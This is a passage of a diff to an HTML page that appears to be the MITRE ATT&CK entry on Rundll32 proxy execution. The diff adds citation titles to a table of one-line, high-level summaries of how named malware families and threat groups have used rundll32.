-                                                            <p><a href="/versions/v14/software/S0204">Briba</a> uses rundll32 within <a href="/versions/v14/techniques/T1547/001">Registry Run Keys / Startup Folder</a> entries to execute malicious DLLs.<span onclick=scrollToRef('scite-25') id="scite-ref-25-a" class="scite-citeref-number" data-reference="Symantec Briba May 2012"><sup><a href="https://www.symantec.com/security_response/writeup.jsp?docid=2012-051515-2843-99" target="_blank" data-hasqtip="24" aria-describedby="qtip-24">[25]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S0204">Briba</a> uses rundll32 within <a href="/versions/v14/techniques/T1547/001">Registry Run Keys / Startup Folder</a> entries to execute malicious DLLs.<span onclick=scrollToRef('scite-25') id="scite-ref-25-a" class="scite-citeref-number" title="Ladley, F. (2012, May 15). Backdoor.Briba. Retrieved February 21, 2018."data-reference="Symantec Briba May 2012"><sup><a href="https://www.symantec.com/security_response/writeup.jsp?docid=2012-051515-2843-99" target="_blank" data-hasqtip="24" aria-describedby="qtip-24">[25]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -641,7 +640,7 @@
                                                 <a href="/versions/v14/software/S1039"> Bumblebee </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S1039">Bumblebee</a> has used <code>rundll32</code> for execution of the loader component.<span onclick=scrollToRef('scite-26') id="scite-ref-26-a" class="scite-citeref-number" data-reference="Proofpoint Bumblebee April 2022"><sup><a href="https://www.proofpoint.com/us/blog/threat-insight/bumblebee-is-still-transforming" target="_blank" data-hasqtip="25" aria-describedby="qtip-25">[26]</a></sup></span><span onclick=scrollToRef('scite-27') id="scite-ref-27-a" class="scite-citeref-number" data-reference="Symantec Bumblebee June 2022"><sup><a href="https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/bumblebee-loader-cybercrime" target="_blank" data-hasqtip="26" aria-describedby="qtip-26">[27]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S1039">Bumblebee</a> has used <code>rundll32</code> for execution of the loader component.<span onclick=scrollToRef('scite-26') id="scite-ref-26-a" class="scite-citeref-number" title="Merriman, K. and Trouerbach, P. (2022, April 28). This isn't Optimus Prime's Bumblebee but it's Still Transforming. Retrieved August 22, 2022."data-reference="Proofpoint Bumblebee April 2022"><sup><a href="https://www.proofpoint.com/us/blog/threat-insight/bumblebee-is-still-transforming" target="_blank" data-hasqtip="25" aria-describedby="qtip-25">[26]</a></sup></span><span onclick=scrollToRef('scite-27') id="scite-ref-27-a" class="scite-citeref-number" title="Kamble, V. (2022, June 28). Bumblebee: New Loader Rapidly Assuming Central Position in Cyber-crime Ecosystem. Retrieved August 24, 2022."data-reference="Symantec Bumblebee June 2022"><sup><a href="https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/bumblebee-loader-cybercrime" target="_blank" data-hasqtip="26" aria-describedby="qtip-26">[27]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -653,7 +652,7 @@
                                                 <a href="/versions/v14/campaigns/C0015"> C0015 </a>
                                             </td>
                                             <td>
-                                                            <p>During <a href="https://attack.mitre.org/campaigns/C0015">C0015</a>, the threat actors loaded DLLs via <code>rundll32</code> using the <code>svchost</code> process.<span onclick=scrollToRef('scite-28') id="scite-ref-28-a" class="scite-citeref-number" data-reference="DFIR Conti Bazar Nov 2021"><sup><a href="https://thedfirreport.com/2021/11/29/continuing-the-bazar-ransomware-story/" target="_blank" data-hasqtip="27" aria-describedby="qtip-27">[28]</a></sup></span></p>
+                                                            <p>During <a href="https://attack.mitre.org/campaigns/C0015">C0015</a>, the threat actors loaded DLLs via <code>rundll32</code> using the <code>svchost</code> process.<span onclick=scrollToRef('scite-28') id="scite-ref-28-a" class="scite-citeref-number" title="DFIR Report. (2021, November 29). CONTInuing the Bazar Ransomware Story. Retrieved September 29, 2022."data-reference="DFIR Conti Bazar Nov 2021"><sup><a href="https://thedfirreport.com/2021/11/29/continuing-the-bazar-ransomware-story/" target="_blank" data-hasqtip="27" aria-describedby="qtip-27">[28]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -665,7 +664,7 @@
                                                 <a href="/versions/v14/campaigns/C0018"> C0018 </a>
                                             </td>
                                             <td>
-                                                            <p>During <a href="https://attack.mitre.org/campaigns/C0018">C0018</a>, the threat actors used <code>rundll32</code> to run <a href="/versions/v14/software/S0002">Mimikatz</a>.<span onclick=scrollToRef('scite-29') id="scite-ref-29-a" class="scite-citeref-number" data-reference="Costa AvosLocker May 2022"><sup><a href="https://www.linkedin.com/pulse/raas-avoslocker-incident-response-analysis-fl%C3%A1vio-costa?trk=articles_directory" target="_blank" data-hasqtip="28" aria-describedby="qtip-28">[29]</a></sup></span></p>
+                                                            <p>During <a href="https://attack.mitre.org/campaigns/C0018">C0018</a>, the threat actors used <code>rundll32</code> to run <a href="/versions/v14/software/S0002">Mimikatz</a>.<span onclick=scrollToRef('scite-29') id="scite-ref-29-a" class="scite-citeref-number" title="Costa, F. (2022, May 1). RaaS AvosLocker Incident Response Analysis. Retrieved January 11, 2023."data-reference="Costa AvosLocker May 2022"><sup><a href="https://www.linkedin.com/pulse/raas-avoslocker-incident-response-analysis-fl%C3%A1vio-costa?trk=articles_directory" target="_blank" data-hasqtip="28" aria-describedby="qtip-28">[29]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -677,7 +676,7 @@
                                                 <a href="/versions/v14/campaigns/C0021"> C0021 </a>
                                             </td>
                                             <td>
-                                                            <p>During <a href="https://attack.mitre.org/campaigns/C0021">C0021</a>, the threat actors used <code>rundll32.exe</code> to execute the <a href="/versions/v14/software/S0154">Cobalt Strike</a> Beacon loader DLL.<span onclick=scrollToRef('scite-30') id="scite-ref-30-a" class="scite-citeref-number" data-reference="FireEye APT29 Nov 2018"><sup><a href="https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html" target="_blank" data-hasqtip="29" aria-describedby="qtip-29">[30]</a></sup></span></p>
+                                                            <p>During <a href="https://attack.mitre.org/campaigns/C0021">C0021</a>, the threat actors used <code>rundll32.exe</code> to execute the <a href="/versions/v14/software/S0154">Cobalt Strike</a> Beacon loader DLL.<span onclick=scrollToRef('scite-30') id="scite-ref-30-a" class="scite-citeref-number" title="Dunwoody, M., et al. (2018, November 19). Not So Cozy: An Uncomfortable Examination of a Suspected APT29 Phishing Campaign. Retrieved November 27, 2018."data-reference="FireEye APT29 Nov 2018"><sup><a href="https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html" target="_blank" data-hasqtip="29" aria-describedby="qtip-29">[30]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -689,7 +688,7 @@
                                                 <a href="/versions/v14/groups/G0008"> Carbanak </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/groups/G0008">Carbanak</a> installs VNC server software that executes through rundll32.<span onclick=scrollToRef('scite-31') id="scite-ref-31-a" class="scite-citeref-number" data-reference="Kaspersky Carbanak"><sup><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08064518/Carbanak_APT_eng.pdf" target="_blank" data-hasqtip="30" aria-describedby="qtip-30">[31]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/groups/G0008">Carbanak</a> installs VNC server software that executes through rundll32.<span onclick=scrollToRef('scite-31') id="scite-ref-31-a" class="scite-citeref-number" title="Kaspersky Lab's Global Research and Analysis Team. (2015, February). CARBANAK APT THE GREAT BANK ROBBERY. Retrieved August 23, 2018."data-reference="Kaspersky Carbanak"><sup><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08064518/Carbanak_APT_eng.pdf" target="_blank" data-hasqtip="30" aria-describedby="qtip-30">[31]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -701,7 +700,7 @@
                                                 <a href="/versions/v14/software/S0154"> Cobalt Strike </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S0154">Cobalt Strike</a> can use <code>rundll32.exe</code> to load DLL from the command line.<span onclick=scrollToRef('scite-32') id="scite-ref-32-a" class="scite-citeref-number" data-reference="Cobalt Strike Manual 4.3 November 2020"><sup><a href="https://web.archive.org/web/20210708035426/https://www.cobaltstrike.com/downloads/csmanual43.pdf" target="_blank" data-hasqtip="31" aria-describedby="qtip-31">[32]</a></sup></span><span onclick=scrollToRef('scite-28') id="scite-ref-28-a" class="scite-citeref-number" data-reference="DFIR Conti Bazar Nov 2021"><sup><a href="https://thedfirreport.com/2021/11/29/continuing-the-bazar-ransomware-story/" target="_blank" data-hasqtip="27" aria-describedby="qtip-27">[28]</a></sup></span><span onclick=scrollToRef('scite-33') id="scite-ref-33-a" class="scite-citeref-number" data-reference="Trend Micro Black Basta October 2022"><sup><a href="https://www.trendmicro.com/en_us/research/22/j/black-basta-infiltrates-networks-via-qakbot-brute-ratel-and-coba.html" target="_blank" data-hasqtip="32" aria-describedby="qtip-32">[33]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S0154">Cobalt Strike</a> can use <code>rundll32.exe</code> to load DLL from the command line.<span onclick=scrollToRef('scite-32') id="scite-ref-32-a" class="scite-citeref-number" title="Strategic Cyber LLC. (2020, November 5). Cobalt Strike: Advanced Threat Tactics for Penetration Testers. Retrieved April 13, 2021."data-reference="Cobalt Strike Manual 4.3 November 2020"><sup><a href="https://web.archive.org/web/20210708035426/https://www.cobaltstrike.com/downloads/csmanual43.pdf" target="_blank" data-hasqtip="31" aria-describedby="qtip-31">[32]</a></sup></span><span onclick=scrollToRef('scite-28') id="scite-ref-28-a" class="scite-citeref-number" title="DFIR Report. (2021, November 29). CONTInuing the Bazar Ransomware Story. Retrieved September 29, 2022."data-reference="DFIR Conti Bazar Nov 2021"><sup><a href="https://thedfirreport.com/2021/11/29/continuing-the-bazar-ransomware-story/" target="_blank" data-hasqtip="27" aria-describedby="qtip-27">[28]</a></sup></span><span onclick=scrollToRef('scite-33') id="scite-ref-33-a" class="scite-citeref-number" title="Kenefick, I. et al. (2022, October 12). Black Basta Ransomware Gang Infiltrates Networks via QAKBOT, Brute Ratel, and Cobalt Strike. Retrieved February 6, 2023."data-reference="Trend Micro Black Basta October 2022"><sup><a href="https://www.trendmicro.com/en_us/research/22/j/black-basta-infiltrates-networks-via-qakbot-brute-ratel-and-coba.html" target="_blank" data-hasqtip="32" aria-describedby="qtip-32">[33]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -713,7 +712,7 @@
                                                 <a href="/versions/v14/software/S0244"> Comnie </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S0244">Comnie</a> uses Rundll32 to load a malicious DLL.<span onclick=scrollToRef('scite-34') id="scite-ref-34-a" class="scite-citeref-number" data-reference="Palo Alto Comnie"><sup><a href="https://researchcenter.paloaltonetworks.com/2018/01/unit42-comnie-continues-target-organizations-east-asia/" target="_blank" data-hasqtip="33" aria-describedby="qtip-33">[34]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S0244">Comnie</a> uses Rundll32 to load a malicious DLL.<span onclick=scrollToRef('scite-34') id="scite-ref-34-a" class="scite-citeref-number" title="Grunzweig, J. (2018, January 31). Comnie Continues to Target Organizations in East Asia. Retrieved June 7, 2018."data-reference="Palo Alto Comnie"><sup><a href="https://researchcenter.paloaltonetworks.com/2018/01/unit42-comnie-continues-target-organizations-east-asia/" target="_blank" data-hasqtip="33" aria-describedby="qtip-33">[34]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -725,7 +724,7 @@
                                                 <a href="/versions/v14/groups/G0052"> CopyKittens </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/groups/G0052">CopyKittens</a> uses rundll32 to load various tools on victims, including a lateral movement tool named Vminst, Cobalt Strike, and shellcode.<span onclick=scrollToRef('scite-35') id="scite-ref-35-a" class="scite-citeref-number" data-reference="ClearSky Wilted Tulip July 2017"><sup><a href="http://www.clearskysec.com/wp-content/uploads/2017/07/Operation_Wilted_Tulip.pdf" target="_blank" data-hasqtip="34" aria-describedby="qtip-34">[35]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/groups/G0052">CopyKittens</a> uses rundll32 to load various tools on victims, including a lateral movement tool named Vminst, Cobalt Strike, and shellcode.<span onclick=scrollToRef('scite-35') id="scite-ref-35-a" class="scite-citeref-number" title="ClearSky Cyber Security and Trend Micro. (2017, July). Operation Wilted Tulip: Exposing a cyber espionage apparatus. Retrieved August 21, 2017."data-reference="ClearSky Wilted Tulip July 2017"><sup><a href="http://www.clearskysec.com/wp-content/uploads/2017/07/Operation_Wilted_Tulip.pdf" target="_blank" data-hasqtip="34" aria-describedby="qtip-34">[35]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -737,7 +736,7 @@
                                                 <a href="/versions/v14/software/S0137"> CORESHELL </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S0137">CORESHELL</a> is installed via execution of rundll32 with an export named "init" or "InitW."<span onclick=scrollToRef('scite-36') id="scite-ref-36-a" class="scite-citeref-number" data-reference="Microsoft SIR Vol 19"><sup><a href="http://download.microsoft.com/download/4/4/C/44CDEF0E-7924-4787-A56A-16261691ACE3/Microsoft_Security_Intelligence_Report_Volume_19_English.pdf" target="_blank" data-hasqtip="35" aria-describedby="qtip-35">[36]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S0137">CORESHELL</a> is installed via execution of rundll32 with an export named "init" or "InitW."<span onclick=scrollToRef('scite-36') id="scite-ref-36-a" class="scite-citeref-number" title="Anthe, C. et al. (2015, October 19). Microsoft Security Intelligence Report Volume 19. Retrieved December 23, 2015."data-reference="Microsoft SIR Vol 19"><sup><a href="http://download.microsoft.com/download/4/4/C/44CDEF0E-7924-4787-A56A-16261691ACE3/Microsoft_Security_Intelligence_Report_Volume_19_English.pdf" target="_blank" data-hasqtip="35" aria-describedby="qtip-35">[36]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -749,7 +748,7 @@
                                                 <a href="/versions/v14/software/S0046"> CozyCar </a>
                                             </td>
                                             <td>
-                                                            <p>The <a href="/versions/v14/software/S0046">CozyCar</a> dropper copies the system file rundll32.exe to the install location for the malware, then uses the copy of rundll32.exe to load and execute the main <a href="/versions/v14/software/S0046">CozyCar</a> component.<span onclick=scrollToRef('scite-37') id="scite-ref-37-a" class="scite-citeref-number" data-reference="F-Secure CozyDuke"><sup><a href="https://www.f-secure.com/documents/996508/1030745/CozyDuke" target="_blank" data-hasqtip="36" aria-describedby="qtip-36">[37]</a></sup></span></p>
+                                                            <p>The <a href="/versions/v14/software/S0046">CozyCar</a> dropper copies the system file rundll32.exe to the install location for the malware, then uses the copy of rundll32.exe to load and execute the main <a href="/versions/v14/software/S0046">CozyCar</a> component.<span onclick=scrollToRef('scite-37') id="scite-ref-37-a" class="scite-citeref-number" title="F-Secure Labs. (2015, April 22). CozyDuke: Malware Analysis. Retrieved December 10, 2015."data-reference="F-Secure CozyDuke"><sup><a href="https://www.f-secure.com/documents/996508/1030745/CozyDuke" target="_blank" data-hasqtip="36" aria-describedby="qtip-36">[37]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -761,7 +760,7 @@
                                                 <a href="/versions/v14/software/S0255"> DDKONG </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S0255">DDKONG</a> uses Rundll32 to ensure only a single instance of itself is running at once.<span onclick=scrollToRef('scite-38') id="scite-ref-38-a" class="scite-citeref-number" data-reference="Rancor Unit42 June 2018"><sup><a href="https://researchcenter.paloaltonetworks.com/2018/06/unit42-rancor-targeted-attacks-south-east-asia-using-plaintee-ddkong-malware-families/" target="_blank" data-hasqtip="37" aria-describedby="qtip-37">[38]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S0255">DDKONG</a> uses Rundll32 to ensure only a single instance of itself is running at once.<span onclick=scrollToRef('scite-38') id="scite-ref-38-a" class="scite-citeref-number" title="Ash, B., et al. (2018, June 26). RANCOR: Targeted Attacks in South East Asia Using PLAINTEE and DDKONG Malware Families. Retrieved July 2, 2018."data-reference="Rancor Unit42 June 2018"><sup><a href="https://researchcenter.paloaltonetworks.com/2018/06/unit42-rancor-targeted-attacks-south-east-asia-using-plaintee-ddkong-malware-families/" target="_blank" data-hasqtip="37" aria-describedby="qtip-37">[38]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -773,7 +772,7 @@
                                                 <a href="/versions/v14/software/S1052"> DEADEYE </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S1052">DEADEYE</a> can use <code>rundll32.exe</code> for execution of living off the land binaries (lolbin) such as <code>SHELL32.DLL</code>.<span onclick=scrollToRef('scite-39') id="scite-ref-39-a" class="scite-citeref-number" data-reference="Mandiant APT41"><sup><a href="https://www.mandiant.com/resources/apt41-us-state-governments" target="_blank" data-hasqtip="38" aria-describedby="qtip-38">[39]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S1052">DEADEYE</a> can use <code>rundll32.exe</code> for execution of living off the land binaries (lolbin) such as <code>SHELL32.DLL</code>.<span onclick=scrollToRef('scite-39') id="scite-ref-39-a" class="scite-citeref-number" title="Rufus Brown, Van Ta, Douglas Bienstock, Geoff Ackerman, John Wolfram. (2022, March 8). Does This Look Infected? A Summary of APT41 Targeting U.S. State Governments. Retrieved July 8, 2022."data-reference="Mandiant APT41"><sup><a href="https://www.mandiant.com/resources/apt41-us-state-governments" target="_blank" data-hasqtip="38" aria-describedby="qtip-38">[39]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -785,7 +784,7 @@
                                                 <a href="/versions/v14/software/S0554"> Egregor </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S0554">Egregor</a> has used rundll32 during execution.<span onclick=scrollToRef('scite-40') id="scite-ref-40-a" class="scite-citeref-number" data-reference="Cybereason Egregor Nov 2020"><sup><a href="https://www.cybereason.com/blog/cybereason-vs-egregor-ransomware" target="_blank" data-hasqtip="39" aria-describedby="qtip-39">[40]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S0554">Egregor</a> has used rundll32 during execution.<span onclick=scrollToRef('scite-40') id="scite-ref-40-a" class="scite-citeref-number" title="Rochberger, L. (2020, November 26). Cybereason vs. Egregor Ransomware. Retrieved December 30, 2020."data-reference="Cybereason Egregor Nov 2020"><sup><a href="https://www.cybereason.com/blog/cybereason-vs-egregor-ransomware" target="_blank" data-hasqtip="39" aria-describedby="qtip-39">[40]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -797,7 +796,7 @@
                                                 <a href="/versions/v14/software/S0081"> Elise </a>
                                             </td>
                                             <td>
-                                                            <p>After copying itself to a DLL file, a variant of <a href="/versions/v14/software/S0081">Elise</a> calls the DLL file using rundll32.exe.<span onclick=scrollToRef('scite-41') id="scite-ref-41-a" class="scite-citeref-number" data-reference="Lotus Blossom Jun 2015"><sup><a href="https://www.paloaltonetworks.com/resources/research/unit42-operation-lotus-blossom.html" target="_blank" data-hasqtip="40" aria-describedby="qtip-40">[41]</a></sup></span></p>
+                                                            <p>After copying itself to a DLL file, a variant of <a href="/versions/v14/software/S0081">Elise</a> calls the DLL file using rundll32.exe.<span onclick=scrollToRef('scite-41') id="scite-ref-41-a" class="scite-citeref-number" title="Falcone, R., et al.. (2015, June 16). Operation Lotus Blossom. Retrieved February 15, 2016."data-reference="Lotus Blossom Jun 2015"><sup><a href="https://www.paloaltonetworks.com/resources/research/unit42-operation-lotus-blossom.html" target="_blank" data-hasqtip="40" aria-describedby="qtip-40">[41]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -809,7 +808,7 @@
                                                 <a href="/versions/v14/software/S0082"> Emissary </a>
                                             </td>
                                             <td>
-                                                            <p>Variants of <a href="/versions/v14/software/S0082">Emissary</a> have used rundll32.exe in Registry values added to establish persistence.<span onclick=scrollToRef('scite-42') id="scite-ref-42-a" class="scite-citeref-number" data-reference="Emissary Trojan Feb 2016"><sup><a href="http://researchcenter.paloaltonetworks.com/2016/02/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/" target="_blank" data-hasqtip="41" aria-describedby="qtip-41">[42]</a></sup></span></p>
+                                                            <p>Variants of <a href="/versions/v14/software/S0082">Emissary</a> have used rundll32.exe in Registry values added to establish persistence.<span onclick=scrollToRef('scite-42') id="scite-ref-42-a" class="scite-citeref-number" title="Falcone, R. and Miller-Osborn, J. (2016, February 3). Emissary Trojan Changelog: Did Operation Lotus Blossom Cause It to Evolve?. Retrieved February 15, 2016."data-reference="Emissary Trojan Feb 2016"><sup><a href="http://researchcenter.paloaltonetworks.com/2016/02/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/" target="_blank" data-hasqtip="41" aria-describedby="qtip-41">[42]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -821,7 +820,7 @@
                                                 <a href="/versions/v14/software/S0634"> EnvyScout </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S0634">EnvyScout</a> has the ability to proxy execution of malicious files with Rundll32.<span onclick=scrollToRef('scite-24') id="scite-ref-24-a" class="scite-citeref-number" data-reference="MSTIC Nobelium Toolset May 2021"><sup><a href="https://www.microsoft.com/security/blog/2021/05/28/breaking-down-nobeliums-latest-early-stage-toolset/" target="_blank" data-hasqtip="23" aria-describedby="qtip-23">[24]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S0634">EnvyScout</a> has the ability to proxy execution of malicious files with Rundll32.<span onclick=scrollToRef('scite-24') id="scite-ref-24-a" class="scite-citeref-number" title="MSTIC. (2021, May 28). Breaking down NOBELIUM’s latest early-stage toolset. Retrieved August 4, 2021."data-reference="MSTIC Nobelium Toolset May 2021"><sup><a href="https://www.microsoft.com/security/blog/2021/05/28/breaking-down-nobeliums-latest-early-stage-toolset/" target="_blank" data-hasqtip="23" aria-describedby="qtip-23">[24]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -833,7 +832,7 @@
                                                 <a href="/versions/v14/software/S0568"> EVILNUM </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S0568">EVILNUM</a> can execute commands and scripts through rundll32.<span onclick=scrollToRef('scite-43') id="scite-ref-43-a" class="scite-citeref-number" data-reference="Prevailion EvilNum May 2020"><sup><a href="https://www.prevailion.com/phantom-in-the-command-shell-2/" target="_blank" data-hasqtip="42" aria-describedby="qtip-42">[43]</a></sup></span> </p>
+                                                            <p><a href="/versions/v14/software/S0568">EVILNUM</a> can execute commands and scripts through rundll32.<span onclick=scrollToRef('scite-43') id="scite-ref-43-a" class="scite-citeref-number" title="Adamitis, D. (2020, May 6). Phantom in the Command Shell. Retrieved December 22, 2021."data-reference="Prevailion EvilNum May 2020"><sup><a href="https://www.prevailion.com/phantom-in-the-command-shell-2/" target="_blank" data-hasqtip="42" aria-describedby="qtip-42">[43]</a></sup></span> </p>
 
                                             </td>
                                         </tr>
@@ -845,7 +844,7 @@
                                                 <a href="/versions/v14/software/S0512"> FatDuke </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S0512">FatDuke</a> can execute via rundll32.<span onclick=scrollToRef('scite-44') id="scite-ref-44-a" class="scite-citeref-number" data-reference="ESET Dukes October 2019"><sup><a href="https://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_Operation_Ghost_Dukes.pdf" target="_blank" data-hasqtip="43" aria-describedby="qtip-43">[44]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S0512">FatDuke</a> can execute via rundll32.<span onclick=scrollToRef('scite-44') id="scite-ref-44-a" class="scite-citeref-number" title="Faou, M., Tartare, M., Dupuy, T. (2019, October). OPERATION GHOST. Retrieved September 23, 2020."data-reference="ESET Dukes October 2019"><sup><a href="https://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_Operation_Ghost_Dukes.pdf" target="_blank" data-hasqtip="43" aria-describedby="qtip-43">[44]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -857,7 +856,7 @@
                                                 <a href="/versions/v14/software/S0267"> FELIXROOT </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S0267">FELIXROOT</a> uses Rundll32 for executing the dropper program.<span onclick=scrollToRef('scite-45') id="scite-ref-45-a" class="scite-citeref-number" data-reference="FireEye FELIXROOT July 2018"><sup><a href="https://www.fireeye.com/blog/threat-research/2018/07/microsoft-office-vulnerabilities-used-to-distribute-felixroot-backdoor.html" target="_blank" data-hasqtip="44" aria-describedby="qtip-44">[45]</a></sup></span><span onclick=scrollToRef('scite-46') id="scite-ref-46-a" class="scite-citeref-number" data-reference="ESET GreyEnergy Oct 2018"><sup><a href="https://www.welivesecurity.com/wp-content/uploads/2018/10/ESET_GreyEnergy.pdf" target="_blank" data-hasqtip="45" aria-describedby="qtip-45">[46]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S0267">FELIXROOT</a> uses Rundll32 for executing the dropper program.<span onclick=scrollToRef('scite-45') id="scite-ref-45-a" class="scite-citeref-number" title="Patil, S. (2018, June 26). Microsoft Office Vulnerabilities Used to Distribute FELIXROOT Backdoor in Recent Campaign. Retrieved July 31, 2018."data-reference="FireEye FELIXROOT July 2018"><sup><a href="https://www.fireeye.com/blog/threat-research/2018/07/microsoft-office-vulnerabilities-used-to-distribute-felixroot-backdoor.html" target="_blank" data-hasqtip="44" aria-describedby="qtip-44">[45]</a></sup></span><span onclick=scrollToRef('scite-46') id="scite-ref-46-a" class="scite-citeref-number" title="Cherepanov, A. (2018, October). GREYENERGY A successor to BlackEnergy. Retrieved November 15, 2018."data-reference="ESET GreyEnergy Oct 2018"><sup><a href="https://www.welivesecurity.com/wp-content/uploads/2018/10/ESET_GreyEnergy.pdf" target="_blank" data-hasqtip="45" aria-describedby="qtip-45">[46]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -869,7 +868,7 @@
                                                 <a href="/versions/v14/groups/G0046"> FIN7 </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/groups/G0046">FIN7</a> has used <code>rundll32.exe</code> to execute malware on a compromised network.<span onclick=scrollToRef('scite-47') id="scite-ref-47-a" class="scite-citeref-number" data-reference="Mandiant FIN7 Apr 2022"><sup><a href="https://www.mandiant.com/resources/evolution-of-fin7" target="_blank" data-hasqtip="46" aria-describedby="qtip-46">[47]</a></sup></span> </p>
+                                                            <p><a href="/versions/v14/groups/G0046">FIN7</a> has used <code>rundll32.exe</code> to execute malware on a compromised network.<span onclick=scrollToRef('scite-47') id="scite-ref-47-a" class="scite-citeref-number" title="Abdo, B., et al. (2022, April 4). FIN7 Power Hour: Adversary Archaeology and the Evolution of FIN7. Retrieved April 5, 2022."data-reference="Mandiant FIN7 Apr 2022"><sup><a href="https://www.mandiant.com/resources/evolution-of-fin7" target="_blank" data-hasqtip="46" aria-describedby="qtip-46">[47]</a></sup></span> </p>
 
                                             </td>
                                         </tr>
@@ -881,7 +880,7 @@
                                                 <a href="/versions/v14/software/S0143"> Flame </a>
                                             </td>
                                             <td>
-                                                            <p>Rundll32.exe is used as a way of executing <a href="/versions/v14/software/S0143">Flame</a> at the command-line.<span onclick=scrollToRef('scite-48') id="scite-ref-48-a" class="scite-citeref-number" data-reference="Crysys Skywiper"><sup><a href="https://www.crysys.hu/publications/files/skywiper.pdf" target="_blank" data-hasqtip="47" aria-describedby="qtip-47">[48]</a></sup></span></p>
+                                                            <p>Rundll32.exe is used as a way of executing <a href="/versions/v14/software/S0143">Flame</a> at the command-line.<span onclick=scrollToRef('scite-48') id="scite-ref-48-a" class="scite-citeref-number" title="sKyWIper Analysis Team. (2012, May 31). sKyWIper (a.k.a. Flame a.k.a. Flamer):  A complex malware for targeted attacks. Retrieved September 6, 2018."data-reference="Crysys Skywiper"><sup><a href="https://www.crysys.hu/publications/files/skywiper.pdf" target="_blank" data-hasqtip="47" aria-describedby="qtip-47">[48]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -893,7 +892,7 @@
                                                 <a href="/versions/v14/software/S0381"> FlawedAmmyy </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S0381">FlawedAmmyy</a> has used <code>rundll32</code> for execution.<span onclick=scrollToRef('scite-49') id="scite-ref-49-a" class="scite-citeref-number" data-reference="Korean FSI TA505 2020"><sup><a href="https://www.fsec.or.kr/user/bbs/fsec/163/344/bbsDataView/1382.do?page=1&column=&search=&searchSDate=&searchEDate=&bbsDataCategory=" target="_blank" data-hasqtip="48" aria-describedby="qtip-48">[49]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S0381">FlawedAmmyy</a> has used <code>rundll32</code> for execution.<span onclick=scrollToRef('scite-49') id="scite-ref-49-a" class="scite-citeref-number" title="Financial Security Institute. (2020, February 28). Profiling of TA505 Threat Group That Continues to Attack the Financial Sector. Retrieved July 14, 2022."data-reference="Korean FSI TA505 2020"><sup><a href="https://www.fsec.or.kr/user/bbs/fsec/163/344/bbsDataView/1382.do?page=1&column=&search=&searchSDate=&searchEDate=&bbsDataCategory=" target="_blank" data-hasqtip="48" aria-describedby="qtip-48">[49]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -905,7 +904,7 @@
                                                 <a href="/versions/v14/software/S1044"> FunnyDream </a>
                                             </td>
                                             <td>
